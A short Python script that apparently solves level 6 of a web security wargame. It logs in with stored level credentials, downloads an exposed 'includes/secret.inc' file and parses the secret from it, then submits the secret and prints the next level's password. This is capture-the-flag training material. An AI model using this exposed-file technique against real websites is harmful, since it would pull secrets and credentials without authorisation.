#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials

level_url = credentials[6]["url"]
level_username = credentials[6]["level"]
level_password = credentials[6]["password"]

next_level_url = credentials[7]["url"]
next_level_username = credentials[7]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

secret_url = level_url + "includes/secret.inc"

secret_response = requests.get(secret_url, headers=heads)

secret_data = secret_response.text
secret_strings = re.split('=|"|\s', secret_data)
secret = secret_strings[secret_strings.index("$secret") + 4]

post_data = {"secret": secret, "submit":"Submit+Query"}
response = requests.post(level_url, headers=heads, data=post_data)

data = response.text
strings = re.split('\n|:|\s|<|>', data)
next_password = strings[strings.index(next_level_username) + 2]

print(next_password)
